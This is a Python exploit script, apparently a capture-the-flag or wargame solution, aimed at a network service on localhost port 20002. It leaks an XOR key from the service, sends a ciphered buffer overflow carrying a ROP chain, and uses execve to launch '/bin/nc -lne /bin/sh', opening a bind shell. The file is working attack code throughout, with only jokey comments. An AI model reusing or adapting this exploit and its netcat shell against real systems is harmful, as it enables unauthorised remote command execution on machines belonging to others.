# -*- coding: utf-8 -*-
import socket, time
from struct import pack, unpack

JUNK=0xdeadbabe
OVERFLOW=0x10
overflowedSize=0x20000+OVERFLOW
blocksize=128
links=[
0x804952d, # &nread
0x8048815, # add esp, 8; pop ebx; ret
1,         # nread(1,
0x804b464, #       &buffer,
20,        #       size)
0x804952d, # &nread
0x8048815, # add esp, 8; pop ebx; ret
1,         # nread(1,
0x804b42c, #       &buffer,
13,        #       size)
0x80489b0, # &(execve@plt)
JUNK,
0x804b471, # &"/bin/nc"
0x804b42d, # &argv
0          # no envp
]
chain=''.join(pack('I', link) for link in links)
PAYLOAD='E'+pack('I', blocksize)+"\x00"*blocksize
KEYBUF=[]

def cipher(message, length):
global KEYBUF
cipherd = []
for i in xrange(0, length, 4):
cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
return cipherd

def main():
global overflowedSize, blocksize, PAYLOAD, KEYBUF, chain

# Create connection & Send initial payload 
s = socket.create_connection(("127.0.0.1", 20002))
s.sendall(PAYLOAD)

# Flush some garbage down the toilet (177 ascii + 4 size)
s.recv(181, socket.MSG_WAITALL)

# retrieve the key, hashtag 1337cr4ck3r
key=s.recv(128, socket.MSG_WAITALL)
KEYBUF=[unpack('I',key[i:i+4])[0] for i in xrange(0, 128, 4)]

# Create a ciphered block of payload
payload='A'*(overflowedSize)+chain
ENCRYPTED_PAYLOAD='E'+pack('I', overflowedSize+len(chain))
ENCRYPTED_PAYLOAD+=''.join(pack('I', x) for x in cipher(payload, len(payload))) # <- EZ

# Vamos ala explotar!
s.sendall(ENCRYPTED_PAYLOAD+"Q")
# Wait for our payload to process
time.sleep(0.5)
# send some strings with relevant binaries and arguments
s.sendall('/bin/sh\x00-lne\x00/bin/nc\x00')
# Cool people are late to the party
time.sleep(0.5)
# send argv pointers
s.sendall(pack('I', 0x804b471)+pack('I', 0x804b46c)+pack('I',0x804b464))
# All is well, Sayonara.
s.close()
return 0

exit(main())
